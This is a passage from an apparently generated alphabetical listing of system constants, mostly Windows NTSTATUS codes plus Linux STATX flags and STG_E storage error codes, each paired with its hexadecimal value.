STATUS_TRANSACTION_NO_RELEASE                                             NTStatus      = 0xC0000211
STATUS_TRANSACTION_NO_SUPERIOR                                            NTStatus      = 0xC019005F
STATUS_TRANSACTION_OBJECT_EXPIRED                                         NTStatus      = 0xC0190055
STATUS_TRANSACTION_PROPAGATION_FAILED                                     NTStatus      = 0xC0190010
STATUS_TRANSACTION_RECORD_TOO_LONG                                        NTStatus      = 0xC0190058
STATUS_TRANSACTION_REQUEST_NOT_VALID                                      NTStatus      = 0xC0190013
STATUS_TRANSACTION_REQUIRED_PROMOTION                                     NTStatus      = 0xC0190043
STATUS_TRANSACTION_RESPONDED                                              NTStatus      = 0xC0000213
STATUS_TRANSACTION_RESPONSE_NOT_ENLISTED                                  NTStatus      = 0xC0190057
STATUS_TRANSACTION_SCOPE_CALLBACKS_NOT_SET                                NTStatus      = 0x80190042
STATUS_TRANSACTION_SUPERIOR_EXISTS                                        NTStatus      = 0xC0190012
STATUS_TRANSACTION_TIMED_OUT                                              NTStatus      = 0xC0000210
STATUS_TRANSLATION_COMPLETE                                               NTStatus      = 0x00000120
STATUS_TRANSPORT_FULL                                                     NTStatus      = 0xC00002CA
STATUS_TRIGGERED_EXECUTABLE_MEMORY_WRITE                                  NTStatus      = 0xC0000726
STATUS_TRIM_READ_ZERO_NOT_SUPPORTED                                       NTStatus      = 0xC0000472
STATUS_TRUSTED_DOMAIN_FAILURE                                             NTStatus      = 0xC000018C
STATUS_TRUSTED_RELATIONSHIP_FAILURE                                       NTStatus      = 0xC000018D
STATUS_TRUST_FAILURE                                                      NTStatus      = 0xC0000190
STATUS_TS_INCOMPATIBLE_SESSIONS                                           NTStatus      = 0xC00A0039
STATUS_TS_VIDEO_SUBSYSTEM_ERROR                                           NTStatus      = 0xC00A003A
STATUS_TXF_ATTRIBUTE_CORRUPT                                              NTStatus      = 0xC019003D
STATUS_TXF_DIR_NOT_EMPTY                                                  NTStatus      = 0xC0190039
STATUS_TXF_METADATA_ALREADY_PRESENT                                       NTStatus      = 0x80190041
STATUS_UNABLE_TO_DECOMMIT_VM                                              NTStatus      = 0xC000002C
STATUS_UNABLE_TO_DELETE_SECTION                                           NTStatus      = 0xC000001B
STATUS_UNABLE_TO_FREE_VM                                                  NTStatus      = 0xC000001A
STATUS_UNABLE_TO_LOCK_MEDIA                                               NTStatus      = 0xC0000175
STATUS_UNABLE_TO_UNLOAD_MEDIA                                             NTStatus      = 0xC0000176
STATUS_UNDEFINED_CHARACTER                                                NTStatus      = 0xC0000163
STATUS_UNDEFINED_SCOPE                                                    NTStatus      = 0xC0000504
STATUS_UNEXPECTED_IO_ERROR                                                NTStatus      = 0xC00000E9
STATUS_UNEXPECTED_MM_CREATE_ERR                                           NTStatus      = 0xC00000EA
STATUS_UNEXPECTED_MM_EXTEND_ERR                                           NTStatus      = 0xC00000EC
STATUS_UNEXPECTED_MM_MAP_ERROR                                            NTStatus      = 0xC00000EB
STATUS_UNEXPECTED_NETWORK_ERROR                                           NTStatus      = 0xC00000C4
STATUS_UNFINISHED_CONTEXT_DELETED                                         NTStatus      = 0xC00002EE
STATUS_UNHANDLED_EXCEPTION                                                NTStatus      = 0xC0000144
STATUS_UNKNOWN_REVISION                                                   NTStatus      = 0xC0000058
STATUS_UNMAPPABLE_CHARACTER                                               NTStatus      = 0xC0000162
STATUS_UNRECOGNIZED_MEDIA                                                 NTStatus      = 0xC0000014
STATUS_UNRECOGNIZED_VOLUME                                                NTStatus      = 0xC000014F
STATUS_UNSUCCESSFUL                                                       NTStatus      = 0xC0000001
STATUS_UNSUPPORTED_COMPRESSION                                            NTStatus      = 0xC000025F
STATUS_UNSUPPORTED_PREAUTH                                                NTStatus      = 0xC0000351
STATUS_UNWIND                                                             NTStatus      = 0xC0000027
STATUS_UNWIND_CONSOLIDATE                                                 NTStatus      = 0x80000029
STATUS_USER2USER_REQUIRED                                                 NTStatus      = 0xC0000408
STATUS_USER_APC                                                           NTStatus      = 0x000000C0
STATUS_USER_DELETE_TRUST_QUOTA_EXCEEDED                                   NTStatus      = 0xC0000403
STATUS_USER_EXISTS                                                        NTStatus      = 0xC0000063
STATUS_USER_MAPPED_FILE                                                   NTStatus      = 0xC0000243
STATUS_USER_SESSION_DELETED                                               NTStatus      = 0xC0000203
STATUS_VALIDATE_CONTINUE                                                  NTStatus      = 0xC0000271
STATUS_VALID_CATALOG_HASH                                                 NTStatus      = 0x0000012D
STATUS_VALID_IMAGE_HASH                                                   NTStatus      = 0x0000012C
STATUS_VALID_STRONG_CODE_HASH                                             NTStatus      = 0x0000012E
STATUS_VARIABLE_NOT_FOUND                                                 NTStatus      = 0xC0000100
STATUS_VDM_DISALLOWED                                                     NTStatus      = 0xC0000414
STATUS_VDM_HARD_ERROR                                                     NTStatus      = 0xC000021D
STATUS_VERIFIER_STOP                                                      NTStatus      = 0xC0000421
STATUS_VERIFY_REQUIRED                                                    NTStatus      = 0x80000016
STATUS_VHDSET_BACKING_STORAGE_NOT_FOUND                                   NTStatus      = 0xC05CFF0C
STATUS_VHD_ALREADY_AT_OR_BELOW_MINIMUM_VIRTUAL_SIZE                       NTStatus      = 0xC03A0033
STATUS_VHD_BITMAP_MISMATCH                                                NTStatus      = 0xC03A000C
STATUS_VHD_BLOCK_ALLOCATION_FAILURE                                       NTStatus      = 0xC03A0009
STATUS_VHD_BLOCK_ALLOCATION_TABLE_CORRUPT                                 NTStatus      = 0xC03A000A
STATUS_VHD_CHANGE_TRACKING_DISABLED                                       NTStatus      = 0xC03A002A
STATUS_VHD_CHILD_PARENT_ID_MISMATCH                                       NTStatus      = 0xC03A000E
STATUS_VHD_CHILD_PARENT_SIZE_MISMATCH                                     NTStatus      = 0xC03A0017
STATUS_VHD_CHILD_PARENT_TIMESTAMP_MISMATCH                                NTStatus      = 0xC03A000F
STATUS_VHD_COULD_NOT_COMPUTE_MINIMUM_VIRTUAL_SIZE                         NTStatus      = 0xC03A0032
STATUS_VHD_DIFFERENCING_CHAIN_CYCLE_DETECTED                              NTStatus      = 0xC03A0018
STATUS_VHD_DIFFERENCING_CHAIN_ERROR_IN_PARENT                             NTStatus      = 0xC03A0019
STATUS_VHD_DRIVE_FOOTER_CHECKSUM_MISMATCH                                 NTStatus      = 0xC03A0002
STATUS_VHD_DRIVE_FOOTER_CORRUPT                                           NTStatus      = 0xC03A0003
STATUS_VHD_DRIVE_FOOTER_MISSING                                           NTStatus      = 0xC03A0001
STATUS_VHD_FORMAT_UNKNOWN                                                 NTStatus      = 0xC03A0004
STATUS_VHD_FORMAT_UNSUPPORTED_VERSION                                     NTStatus      = 0xC03A0005
STATUS_VHD_INVALID_BLOCK_SIZE                                             NTStatus      = 0xC03A000B
STATUS_VHD_INVALID_CHANGE_TRACKING_ID                                     NTStatus      = 0xC03A0029
STATUS_VHD_INVALID_FILE_SIZE                                              NTStatus      = 0xC03A0013
STATUS_VHD_INVALID_SIZE                                                   NTStatus      = 0xC03A0012
STATUS_VHD_INVALID_STATE                                                  NTStatus      = 0xC03A001C
STATUS_VHD_INVALID_TYPE                                                   NTStatus      = 0xC03A001B
STATUS_VHD_METADATA_FULL                                                  NTStatus      = 0xC03A0028
STATUS_VHD_METADATA_READ_FAILURE                                          NTStatus      = 0xC03A0010
STATUS_VHD_METADATA_WRITE_FAILURE                                         NTStatus      = 0xC03A0011
STATUS_VHD_MISSING_CHANGE_TRACKING_INFORMATION                            NTStatus      = 0xC03A0030
STATUS_VHD_PARENT_VHD_ACCESS_DENIED                                       NTStatus      = 0xC03A0016
STATUS_VHD_PARENT_VHD_NOT_FOUND                                           NTStatus      = 0xC03A000D
STATUS_VHD_RESIZE_WOULD_TRUNCATE_DATA                                     NTStatus      = 0xC03A0031
STATUS_VHD_SHARED                                                         NTStatus      = 0xC05CFF0A
STATUS_VHD_SPARSE_HEADER_CHECKSUM_MISMATCH                                NTStatus      = 0xC03A0006
STATUS_VHD_SPARSE_HEADER_CORRUPT                                          NTStatus      = 0xC03A0008
STATUS_VHD_SPARSE_HEADER_UNSUPPORTED_VERSION                              NTStatus      = 0xC03A0007
STATUS_VIDEO_DRIVER_DEBUG_REPORT_REQUEST                                  NTStatus      = 0x401B00EC
STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD                                   NTStatus      = 0xC01B00EA
STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD_RECOVERED                         NTStatus      = 0x801B00EB
STATUS_VID_CHILD_GPA_PAGE_SET_CORRUPTED                                   NTStatus      = 0xC037000E
STATUS_VID_DUPLICATE_HANDLER                                              NTStatus      = 0xC0370001
STATUS_VID_EXCEEDED_KM_CONTEXT_COUNT_LIMIT                                NTStatus      = 0xC037001E
STATUS_VID_EXCEEDED_MBP_ENTRY_MAP_LIMIT                                   NTStatus      = 0xC037000C
STATUS_VID_HANDLER_NOT_PRESENT                                            NTStatus      = 0xC0370004
STATUS_VID_INVALID_CHILD_GPA_PAGE_SET                                     NTStatus      = 0xC0370022
STATUS_VID_INVALID_GPA_RANGE_HANDLE                                       NTStatus      = 0xC0370015
STATUS_VID_INVALID_MEMORY_BLOCK_HANDLE                                    NTStatus      = 0xC0370012
STATUS_VID_INVALID_MESSAGE_QUEUE_HANDLE                                   NTStatus      = 0xC0370014
STATUS_VID_INVALID_NUMA_NODE_INDEX                                        NTStatus      = 0xC0370010
STATUS_VID_INVALID_NUMA_SETTINGS                                          NTStatus      = 0xC037000F
STATUS_VID_INVALID_OBJECT_NAME                                            NTStatus      = 0xC0370005
STATUS_VID_INVALID_PPM_HANDLE                                             NTStatus      = 0xC0370018
STATUS_VID_INVALID_PROCESSOR_STATE                                        NTStatus      = 0xC037001D
STATUS_VID_KM_INTERFACE_ALREADY_INITIALIZED                               NTStatus      = 0xC037001F
STATUS_VID_MBPS_ARE_LOCKED                                                NTStatus      = 0xC0370019
STATUS_VID_MBP_ALREADY_LOCKED_USING_RESERVED_PAGE                         NTStatus      = 0xC0370025
STATUS_VID_MBP_COUNT_EXCEEDED_LIMIT                                       NTStatus      = 0xC0370026
STATUS_VID_MB_PROPERTY_ALREADY_SET_RESET                                  NTStatus      = 0xC0370020
STATUS_VID_MB_STILL_REFERENCED                                            NTStatus      = 0xC037000D
STATUS_VID_MEMORY_BLOCK_LOCK_COUNT_EXCEEDED                               NTStatus      = 0xC0370017
STATUS_VID_MESSAGE_QUEUE_ALREADY_EXISTS                                   NTStatus      = 0xC037000B
STATUS_VID_MESSAGE_QUEUE_CLOSED                                           NTStatus      = 0xC037001A
STATUS_VID_MESSAGE_QUEUE_NAME_TOO_LONG                                    NTStatus      = 0xC0370007
STATUS_VID_MMIO_RANGE_DESTROYED                                           NTStatus      = 0xC0370021
STATUS_VID_NOTIFICATION_QUEUE_ALREADY_ASSOCIATED                          NTStatus      = 0xC0370011
STATUS_VID_NO_MEMORY_BLOCK_NOTIFICATION_QUEUE                             NTStatus      = 0xC0370016
STATUS_VID_PAGE_RANGE_OVERFLOW                                            NTStatus      = 0xC0370013
STATUS_VID_PARTITION_ALREADY_EXISTS                                       NTStatus      = 0xC0370008
STATUS_VID_PARTITION_DOES_NOT_EXIST                                       NTStatus      = 0xC0370009
STATUS_VID_PARTITION_NAME_NOT_FOUND                                       NTStatus      = 0xC037000A
STATUS_VID_PARTITION_NAME_TOO_LONG                                        NTStatus      = 0xC0370006
STATUS_VID_QUEUE_FULL                                                     NTStatus      = 0xC0370003
STATUS_VID_REMOTE_NODE_PARENT_GPA_PAGES_USED                              NTStatus      = 0x80370001
STATUS_VID_RESERVE_PAGE_SET_IS_BEING_USED                                 NTStatus      = 0xC0370023
STATUS_VID_RESERVE_PAGE_SET_TOO_SMALL                                     NTStatus      = 0xC0370024
STATUS_VID_SAVED_STATE_CORRUPT                                            NTStatus      = 0xC0370027
STATUS_VID_SAVED_STATE_INCOMPATIBLE                                       NTStatus      = 0xC0370029
STATUS_VID_SAVED_STATE_UNRECOGNIZED_ITEM                                  NTStatus      = 0xC0370028
STATUS_VID_STOP_PENDING                                                   NTStatus      = 0xC037001C
STATUS_VID_TOO_MANY_HANDLERS                                              NTStatus      = 0xC0370002
STATUS_VID_VIRTUAL_PROCESSOR_LIMIT_EXCEEDED                               NTStatus      = 0xC037001B
STATUS_VID_VTL_ACCESS_DENIED                                              NTStatus      = 0xC037002A
STATUS_VIRTDISK_DISK_ALREADY_OWNED                                        NTStatus      = 0xC03A001E
STATUS_VIRTDISK_DISK_ONLINE_AND_WRITABLE                                  NTStatus      = 0xC03A001F
STATUS_VIRTDISK_NOT_VIRTUAL_DISK                                          NTStatus      = 0xC03A0015
STATUS_VIRTDISK_PROVIDER_NOT_FOUND                                        NTStatus      = 0xC03A0014
STATUS_VIRTDISK_UNSUPPORTED_DISK_SECTOR_SIZE                              NTStatus      = 0xC03A001D
STATUS_VIRTUAL_CIRCUIT_CLOSED                                             NTStatus      = 0xC00000D6
STATUS_VIRTUAL_DISK_LIMITATION                                            NTStatus      = 0xC03A001A
STATUS_VIRUS_DELETED                                                      NTStatus      = 0xC0000907
STATUS_VIRUS_INFECTED                                                     NTStatus      = 0xC0000906
STATUS_VOLMGR_ALL_DISKS_FAILED                                            NTStatus      = 0xC0380029
STATUS_VOLMGR_BAD_BOOT_DISK                                               NTStatus      = 0xC038004F
STATUS_VOLMGR_DATABASE_FULL                                               NTStatus      = 0xC0380001
STATUS_VOLMGR_DIFFERENT_SECTOR_SIZE                                       NTStatus      = 0xC038004E
STATUS_VOLMGR_DISK_CONFIGURATION_CORRUPTED                                NTStatus      = 0xC0380002
STATUS_VOLMGR_DISK_CONFIGURATION_NOT_IN_SYNC                              NTStatus      = 0xC0380003
STATUS_VOLMGR_DISK_CONTAINS_NON_SIMPLE_VOLUME                             NTStatus      = 0xC0380005
STATUS_VOLMGR_DISK_DUPLICATE                                              NTStatus      = 0xC0380006
STATUS_VOLMGR_DISK_DYNAMIC                                                NTStatus      = 0xC0380007
STATUS_VOLMGR_DISK_ID_INVALID                                             NTStatus      = 0xC0380008
STATUS_VOLMGR_DISK_INVALID                                                NTStatus      = 0xC0380009
STATUS_VOLMGR_DISK_LAST_VOTER                                             NTStatus      = 0xC038000A
STATUS_VOLMGR_DISK_LAYOUT_INVALID                                         NTStatus      = 0xC038000B
STATUS_VOLMGR_DISK_LAYOUT_NON_BASIC_BETWEEN_BASIC_PARTITIONS              NTStatus      = 0xC038000C
STATUS_VOLMGR_DISK_LAYOUT_NOT_CYLINDER_ALIGNED                            NTStatus      = 0xC038000D
STATUS_VOLMGR_DISK_LAYOUT_PARTITIONS_TOO_SMALL                            NTStatus      = 0xC038000E
STATUS_VOLMGR_DISK_LAYOUT_PRIMARY_BETWEEN_LOGICAL_PARTITIONS              NTStatus      = 0xC038000F
STATUS_VOLMGR_DISK_LAYOUT_TOO_MANY_PARTITIONS                             NTStatus      = 0xC0380010
STATUS_VOLMGR_DISK_MISSING                                                NTStatus      = 0xC0380011
STATUS_VOLMGR_DISK_NOT_EMPTY                                              NTStatus      = 0xC0380012
STATUS_VOLMGR_DISK_NOT_ENOUGH_SPACE                                       NTStatus      = 0xC0380013
STATUS_VOLMGR_DISK_REVECTORING_FAILED                                     NTStatus      = 0xC0380014
STATUS_VOLMGR_DISK_SECTOR_SIZE_INVALID                                    NTStatus      = 0xC0380015
STATUS_VOLMGR_DISK_SET_NOT_CONTAINED                                      NTStatus      = 0xC0380016
STATUS_VOLMGR_DISK_USED_BY_MULTIPLE_MEMBERS                               NTStatus      = 0xC0380017
STATUS_VOLMGR_DISK_USED_BY_MULTIPLE_PLEXES                                NTStatus      = 0xC0380018
STATUS_VOLMGR_DYNAMIC_DISK_NOT_SUPPORTED                                  NTStatus      = 0xC0380019
STATUS_VOLMGR_EXTENT_ALREADY_USED                                         NTStatus      = 0xC038001A
STATUS_VOLMGR_EXTENT_NOT_CONTIGUOUS                                       NTStatus      = 0xC038001B
STATUS_VOLMGR_EXTENT_NOT_IN_PUBLIC_REGION                                 NTStatus      = 0xC038001C
STATUS_VOLMGR_EXTENT_NOT_SECTOR_ALIGNED                                   NTStatus      = 0xC038001D
STATUS_VOLMGR_EXTENT_OVERLAPS_EBR_PARTITION                               NTStatus      = 0xC038001E
STATUS_VOLMGR_EXTENT_VOLUME_LENGTHS_DO_NOT_MATCH                          NTStatus      = 0xC038001F
STATUS_VOLMGR_FAULT_TOLERANT_NOT_SUPPORTED                                NTStatus      = 0xC0380020
STATUS_VOLMGR_INCOMPLETE_DISK_MIGRATION                                   NTStatus      = 0x80380002
STATUS_VOLMGR_INCOMPLETE_REGENERATION                                     NTStatus      = 0x80380001
STATUS_VOLMGR_INTERLEAVE_LENGTH_INVALID                                   NTStatus      = 0xC0380021
STATUS_VOLMGR_MAXIMUM_REGISTERED_USERS                                    NTStatus      = 0xC0380022
STATUS_VOLMGR_MEMBER_INDEX_DUPLICATE                                      NTStatus      = 0xC0380024
STATUS_VOLMGR_MEMBER_INDEX_INVALID                                        NTStatus      = 0xC0380025
STATUS_VOLMGR_MEMBER_IN_SYNC                                              NTStatus      = 0xC0380023
STATUS_VOLMGR_MEMBER_MISSING                                              NTStatus      = 0xC0380026
STATUS_VOLMGR_MEMBER_NOT_DETACHED                                         NTStatus      = 0xC0380027
STATUS_VOLMGR_MEMBER_REGENERATING                                         NTStatus      = 0xC0380028
STATUS_VOLMGR_MIRROR_NOT_SUPPORTED                                        NTStatus      = 0xC038005B
STATUS_VOLMGR_NOTIFICATION_RESET                                          NTStatus      = 0xC038002C
STATUS_VOLMGR_NOT_PRIMARY_PACK                                            NTStatus      = 0xC0380052
STATUS_VOLMGR_NO_REGISTERED_USERS                                         NTStatus      = 0xC038002A
STATUS_VOLMGR_NO_SUCH_USER                                                NTStatus      = 0xC038002B
STATUS_VOLMGR_NO_VALID_LOG_COPIES                                         NTStatus      = 0xC0380058
STATUS_VOLMGR_NUMBER_OF_DISKS_INVALID                                     NTStatus      = 0xC038005A
STATUS_VOLMGR_NUMBER_OF_DISKS_IN_MEMBER_INVALID                           NTStatus      = 0xC0380055
STATUS_VOLMGR_NUMBER_OF_DISKS_IN_PLEX_INVALID                             NTStatus      = 0xC0380054
STATUS_VOLMGR_NUMBER_OF_EXTENTS_INVALID                                   NTStatus      = 0xC038004D
STATUS_VOLMGR_NUMBER_OF_MEMBERS_INVALID                                   NTStatus      = 0xC038002D
STATUS_VOLMGR_NUMBER_OF_PLEXES_INVALID                                    NTStatus      = 0xC038002E
STATUS_VOLMGR_PACK_CONFIG_OFFLINE                                         NTStatus      = 0xC0380050
STATUS_VOLMGR_PACK_CONFIG_ONLINE                                          NTStatus      = 0xC0380051
STATUS_VOLMGR_PACK_CONFIG_UPDATE_FAILED                                   NTStatus      = 0xC0380004
STATUS_VOLMGR_PACK_DUPLICATE                                              NTStatus      = 0xC038002F
STATUS_VOLMGR_PACK_HAS_QUORUM                                             NTStatus      = 0xC0380034
STATUS_VOLMGR_PACK_ID_INVALID                                             NTStatus      = 0xC0380030
STATUS_VOLMGR_PACK_INVALID                                                NTStatus      = 0xC0380031
STATUS_VOLMGR_PACK_LOG_UPDATE_FAILED                                      NTStatus      = 0xC0380053
STATUS_VOLMGR_PACK_NAME_INVALID                                           NTStatus      = 0xC0380032
STATUS_VOLMGR_PACK_OFFLINE                                                NTStatus      = 0xC0380033
STATUS_VOLMGR_PACK_WITHOUT_QUORUM                                         NTStatus      = 0xC0380035
STATUS_VOLMGR_PARTITION_STYLE_INVALID                                     NTStatus      = 0xC0380036
STATUS_VOLMGR_PARTITION_UPDATE_FAILED                                     NTStatus      = 0xC0380037
STATUS_VOLMGR_PLEX_INDEX_DUPLICATE                                        NTStatus      = 0xC0380039
STATUS_VOLMGR_PLEX_INDEX_INVALID                                          NTStatus      = 0xC038003A
STATUS_VOLMGR_PLEX_IN_SYNC                                                NTStatus      = 0xC0380038
STATUS_VOLMGR_PLEX_LAST_ACTIVE                                            NTStatus      = 0xC038003B
STATUS_VOLMGR_PLEX_MISSING                                                NTStatus      = 0xC038003C
STATUS_VOLMGR_PLEX_NOT_RAID5                                              NTStatus      = 0xC038003F
STATUS_VOLMGR_PLEX_NOT_SIMPLE                                             NTStatus      = 0xC0380040
STATUS_VOLMGR_PLEX_NOT_SIMPLE_SPANNED                                     NTStatus      = 0xC0380057
STATUS_VOLMGR_PLEX_REGENERATING                                           NTStatus      = 0xC038003D
STATUS_VOLMGR_PLEX_TYPE_INVALID                                           NTStatus      = 0xC038003E
STATUS_VOLMGR_PRIMARY_PACK_PRESENT                                        NTStatus      = 0xC0380059
STATUS_VOLMGR_RAID5_NOT_SUPPORTED                                         NTStatus      = 0xC038005C
STATUS_VOLMGR_STRUCTURE_SIZE_INVALID                                      NTStatus      = 0xC0380041
STATUS_VOLMGR_TOO_MANY_NOTIFICATION_REQUESTS                              NTStatus      = 0xC0380042
STATUS_VOLMGR_TRANSACTION_IN_PROGRESS                                     NTStatus      = 0xC0380043
STATUS_VOLMGR_UNEXPECTED_DISK_LAYOUT_CHANGE                               NTStatus      = 0xC0380044
STATUS_VOLMGR_VOLUME_CONTAINS_MISSING_DISK                                NTStatus      = 0xC0380045
STATUS_VOLMGR_VOLUME_ID_INVALID                                           NTStatus      = 0xC0380046
STATUS_VOLMGR_VOLUME_LENGTH_INVALID                                       NTStatus      = 0xC0380047
STATUS_VOLMGR_VOLUME_LENGTH_NOT_SECTOR_SIZE_MULTIPLE                      NTStatus      = 0xC0380048
STATUS_VOLMGR_VOLUME_MIRRORED                                             NTStatus      = 0xC0380056
STATUS_VOLMGR_VOLUME_NOT_MIRRORED                                         NTStatus      = 0xC0380049
STATUS_VOLMGR_VOLUME_NOT_RETAINED                                         NTStatus      = 0xC038004A
STATUS_VOLMGR_VOLUME_OFFLINE                                              NTStatus      = 0xC038004B
STATUS_VOLMGR_VOLUME_RETAINED                                             NTStatus      = 0xC038004C
STATUS_VOLSNAP_ACTIVATION_TIMEOUT                                         NTStatus      = 0xC0500004
STATUS_VOLSNAP_BOOTFILE_NOT_VALID                                         NTStatus      = 0xC0500003
STATUS_VOLSNAP_HIBERNATE_READY                                            NTStatus      = 0x00000125
STATUS_VOLSNAP_PREPARE_HIBERNATE                                          NTStatus      = 0xC0000407
STATUS_VOLUME_DIRTY                                                       NTStatus      = 0xC0000806
STATUS_VOLUME_DISMOUNTED                                                  NTStatus      = 0xC000026E
STATUS_VOLUME_MOUNTED                                                     NTStatus      = 0x00000109
STATUS_VOLUME_NOT_CLUSTER_ALIGNED                                         NTStatus      = 0xC00004A4
STATUS_VOLUME_NOT_UPGRADED                                                NTStatus      = 0xC000029C
STATUS_VRF_CFG_ENABLED                                                    NTStatus      = 0xC000049F
STATUS_VSM_DMA_PROTECTION_NOT_IN_USE                                      NTStatus      = 0xC0450001
STATUS_VSM_NOT_INITIALIZED                                                NTStatus      = 0xC0450000
STATUS_WAIT_0                                                             NTStatus      = 0x00000000
STATUS_WAIT_1                                                             NTStatus      = 0x00000001
STATUS_WAIT_2                                                             NTStatus      = 0x00000002
STATUS_WAIT_3                                                             NTStatus      = 0x00000003
STATUS_WAIT_63                                                            NTStatus      = 0x0000003F
STATUS_WAIT_FOR_OPLOCK                                                    NTStatus      = 0x00000367
STATUS_WAKE_SYSTEM                                                        NTStatus      = 0x40000294
STATUS_WAKE_SYSTEM_DEBUGGER                                               NTStatus      = 0x80000007
STATUS_WAS_LOCKED                                                         NTStatus      = 0x40000019
STATUS_WAS_UNLOCKED                                                       NTStatus      = 0x40000017
STATUS_WIM_NOT_BOOTABLE                                                   NTStatus      = 0xC0000487
STATUS_WMI_ALREADY_DISABLED                                               NTStatus      = 0xC0000302
STATUS_WMI_ALREADY_ENABLED                                                NTStatus      = 0xC0000303
STATUS_WMI_GUID_DISCONNECTED                                              NTStatus      = 0xC0000301
STATUS_WMI_GUID_NOT_FOUND                                                 NTStatus      = 0xC0000295
STATUS_WMI_INSTANCE_NOT_FOUND                                             NTStatus      = 0xC0000296
STATUS_WMI_ITEMID_NOT_FOUND                                               NTStatus      = 0xC0000297
STATUS_WMI_NOT_SUPPORTED                                                  NTStatus      = 0xC00002DD
STATUS_WMI_READ_ONLY                                                      NTStatus      = 0xC00002C6
STATUS_WMI_SET_FAILURE                                                    NTStatus      = 0xC00002C7
STATUS_WMI_TRY_AGAIN                                                      NTStatus      = 0xC0000298
STATUS_WOF_FILE_RESOURCE_TABLE_CORRUPT                                    NTStatus      = 0xC000A2A7
STATUS_WOF_WIM_HEADER_CORRUPT                                             NTStatus      = 0xC000A2A5
STATUS_WOF_WIM_RESOURCE_TABLE_CORRUPT                                     NTStatus      = 0xC000A2A6
STATUS_WORKING_SET_LIMIT_RANGE                                            NTStatus      = 0x40000002
STATUS_WORKING_SET_QUOTA                                                  NTStatus      = 0xC00000A1
STATUS_WOW_ASSERTION                                                      NTStatus      = 0xC0009898
STATUS_WRONG_COMPARTMENT                                                  NTStatus      = 0xC000A085
STATUS_WRONG_CREDENTIAL_HANDLE                                            NTStatus      = 0xC00002F2
STATUS_WRONG_EFS                                                          NTStatus      = 0xC000028F
STATUS_WRONG_PASSWORD                                                     NTStatus      = 0xC000006A
STATUS_WRONG_PASSWORD_CORE                                                NTStatus      = 0xC0000149
STATUS_WRONG_VOLUME                                                       NTStatus      = 0xC0000012
STATUS_WX86_BREAKPOINT                                                    NTStatus      = 0x4000001F
STATUS_WX86_CONTINUE                                                      NTStatus      = 0x4000001D
STATUS_WX86_CREATEWX86TIB                                                 NTStatus      = 0x40000028
STATUS_WX86_EXCEPTION_CHAIN                                               NTStatus      = 0x40000022
STATUS_WX86_EXCEPTION_CONTINUE                                            NTStatus      = 0x40000020
STATUS_WX86_EXCEPTION_LASTCHANCE                                          NTStatus      = 0x40000021
STATUS_WX86_FLOAT_STACK_CHECK                                             NTStatus      = 0xC0000270
STATUS_WX86_INTERNAL_ERROR                                                NTStatus      = 0xC000026F
STATUS_WX86_SINGLE_STEP                                                   NTStatus      = 0x4000001E
STATUS_WX86_UNSIMULATE                                                    NTStatus      = 0x4000001C
STATUS_XMLDSIG_ERROR                                                      NTStatus      = 0xC000A084
STATUS_XML_ENCODING_MISMATCH                                              NTStatus      = 0xC0150021
STATUS_XML_PARSE_ERROR                                                    NTStatus      = 0xC000A083
STATX_/ 
STATX_ALL                                   = 0xfff
STATX_ATIME                                 = 0x20
STATX_ATTR_APPEND                           = 0x20
STATX_ATTR_AUTOMOUNT                        = 0x1000
STATX_ATTR_COMPRESSED                       = 0x4
STATX_ATTR_DAX                              = 0x200000
STATX_ATTR_ENCRYPTED                        = 0x800
STATX_ATTR_IMMUTABLE                        = 0x10
STATX_ATTR_MOUNT_ROOT                       = 0x2000
STATX_ATTR_NODUMP                           = 0x40
STATX_ATTR_VERITY                           = 0x100000
STATX_BASIC_STATS                           = 0x7ff
STATX_BLOCKS                                = 0x400
STATX_BTIME                                 = 0x800
STATX_CTIME                                 = 0x80
STATX_GID                                   = 0x10
STATX_INO                                   = 0x100
STATX_MNT_ID                                = 0x1000
STATX_MODE                                  = 0x2
STATX_MTIME                                 = 0x40
STATX_NLINK                                 = 0x4
STATX_SIZE                                  = 0x200
STATX_TYPE                                  = 0x1
STATX_UID                                   = 0x8
STATX__RESERVED                             = 0x80000000
STD_ERROR_HANDLE  = -12 
STD_INPUT_HANDLE  = -10 
STD_OUTPUT_HANDLE = -11 
STG_E_ABNORMALAPIEXIT                                                     Handle        = 0x800300FA
STG_E_ACCESSDENIED                                                        Handle        = 0x80030005
STG_E_BADBASEADDRESS                                                      Handle        = 0x80030110
STG_E_CANTSAVE                                                            Handle        = 0x80030103
STG_E_CSS_AUTHENTICATION_FAILURE                                          Handle        = 0x80030306
STG_E_CSS_KEY_NOT_ESTABLISHED                                             Handle        = 0x80030308
STG_E_CSS_KEY_NOT_PRESENT                                                 Handle        = 0x80030307
STG_E_CSS_REGION_MISMATCH                                                 Handle        = 0x8003030A
STG_E_CSS_SCRAMBLED_SECTOR                                                Handle        = 0x80030309
STG_E_DEVICE_UNRESPONSIVE                                                 Handle        = 0x8003020A
STG_E_DISKISWRITEPROTECTED                                                Handle        = 0x80030013
STG_E_DOCFILECORRUPT                                                      Handle        = 0x80030109
STG_E_DOCFILETOOLARGE                                                     Handle        = 0x80030111
STG_E_EXTANTMARSHALLINGS                                                  Handle        = 0x80030108
STG_E_FILEALREADYEXISTS                                                   Handle        = 0x80030050
STG_E_FILENOTFOUND                                                        Handle        = 0x80030002
STG_E_FIRMWARE_IMAGE_INVALID                                              Handle        = 0x80030209
STG_E_FIRMWARE_SLOT_INVALID                                               Handle        = 0x80030208
STG_E_INCOMPLETE                                                          Handle        = 0x80030201
STG_E_INSUFFICIENTMEMORY                                                  Handle        = 0x80030008
STG_E_INUSE                                                               Handle        = 0x80030100
STG_E_INVALIDFLAG                                                         Handle        = 0x800300FF
STG_E_INVALIDFUNCTION                                                     Handle        = 0x80030001
STG_E_INVALIDHANDLE                                                       Handle        = 0x80030006
STG_E_INVALIDHEADER                                                       Handle        = 0x800300FB
STG_E_INVALIDNAME                                                         Handle        = 0x800300FC
STG_E_INVALIDPARAMETER                                                    Handle        = 0x80030057
STG_E_INVALIDPOINTER                                                      Handle        = 0x80030009
STG_E_LOCKVIOLATION                                                       Handle        = 0x80030021
STG_E_MEDIUMFULL                                                          Handle        = 0x80030070
STG_E_NOMOREFILES                                                         Handle        = 0x80030012
STG_E_NOTCURRENT                                                          Handle        = 0x80030101
STG_E_NOTFILEBASEDSTORAGE                                                 Handle        = 0x80030107
STG_E_NOTSIMPLEFORMAT                                                     Handle        = 0x80030112
STG_E_OLDDLL                                                              Handle        = 0x80030105
STG_E_OLDFORMAT                                                           Handle        = 0x80030104
STG_E_PATHNOTFOUND                                                        Handle        = 0x80030003
